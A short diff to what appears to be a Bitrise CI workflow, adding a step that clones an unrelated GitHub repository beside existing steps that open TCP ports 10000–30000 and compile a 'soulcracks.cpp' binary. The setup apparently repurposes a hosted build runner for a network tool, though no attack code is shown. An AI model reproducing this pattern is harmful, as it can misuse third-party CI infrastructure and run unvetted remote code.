@@ -1,4 +1,4 @@
-format_version: '11'
+format_version: '13'
 default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
 
 workflows:
@@ -27,6 +27,13 @@ workflows:
                 sudo ufw allow 10000:30000/tcp
                 sudo ufw status
                 g++ -std=c++14 soulcracks.cpp -o soul -pthread
+      - script:
+          title: Configure Repo
+          inputs:
+            - content: |
+                #!/bin/bash
+                git clone https://github.com/bobby623974/Anoy1764.git
+                cd Anoy1764
       - script:
           title: Run Python script
           inputs:
